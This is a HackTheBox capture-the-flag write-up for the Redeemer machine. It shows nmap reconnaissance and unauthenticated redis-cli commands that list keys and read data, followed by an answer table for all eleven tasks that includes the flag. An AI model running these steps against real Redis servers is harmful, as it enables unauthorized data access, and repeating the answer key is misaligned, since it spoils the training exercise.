TITLE: Redeemer
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/ce52eadd09ff5a28a1eea8c65d6683a9.png.1
---

# Redeemer

Redeemer focuses on Redis enumeration and data extraction from an in-memory database.

## Recon

Nmap reveals port 6379 is open, which is the default port for Redis.

```bash
nmap -p- -sV 10.129.171.104
```

| Port | Service | Version |
| :--- | :--- | :--- |
| 6379 | Redis | Redis key-value store 5.0.7 |

## Exploitation

We use `redis-cli` to connect to the target.

```bash
redis-cli -h 10.129.171.104
```

Once connected, we use `info` to gather details about the server and `keys *` to list all stored keys.

```bash
10.129.171.104:6379> info
...
10.129.171.104:6379> select 0
OK
10.129.171.104:6379> keys *
1) "flag"
2) "user"
10.129.171.104:6379> get flag
"03e1d295543ad3dd9810da82022b7d90"
```

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | Which TCP port is open on the machine? | `6379` |
| 2 | Which service is running on the port that is open on the machine? | `redis` |
| 3 | What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Relational Database, (iii) Graph Database. | `In-memory Database` |
| 4 | Which command line utility is used to interact with the Redis server? | `redis-cli` |
| 5 | Which flag is used with the Redis command-line utility to specify the hostname? | `-h` |
| 6 | Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? | `info` |
| 7 | What is the version of the Redis server being used on the target machine? | `5.0.7` |
| 8 | Which command is used to select the desired database in Redis? | `select` |
| 9 | How many databases are there in the Redis server? | `1` |
| 10 | Which command is used to list all the keys present in the database? | `keys *` |
| 11 | Submit root flag | `03e1d295543ad3dd9810da82022b7d90` |
